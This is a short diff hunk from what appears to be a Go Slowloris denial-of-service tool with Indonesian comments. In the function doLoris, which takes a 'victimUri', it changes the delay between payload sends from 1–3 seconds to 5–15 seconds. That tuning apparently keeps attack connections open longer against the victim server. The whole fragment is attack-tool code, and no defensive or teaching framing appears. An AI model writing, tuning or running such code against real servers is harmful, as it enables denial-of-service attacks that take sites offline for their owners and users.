@@ -420,8 +420,8 @@ func doLoris(conn io.ReadWriteCloser, victimUri *url.URL, activeConnectionsCh ch
 	go nullReader(conn, readerStopCh) // Mulai reader untuk mendengarkan respons
 
 	// Rentang sleep interval dinamis (EDIT DI SINI jika ingin rentang berbeda)
-	minSleep := 1 * time.Second
-	maxSleep := 3 * time.Second
+	minSleep := 5* time.Second
+	maxSleep := 15* time.Second
 
 	bytesSent := 0
 	payloadBuf := make([]byte, 250) // Buat buffer payload yang cukup besar di awal
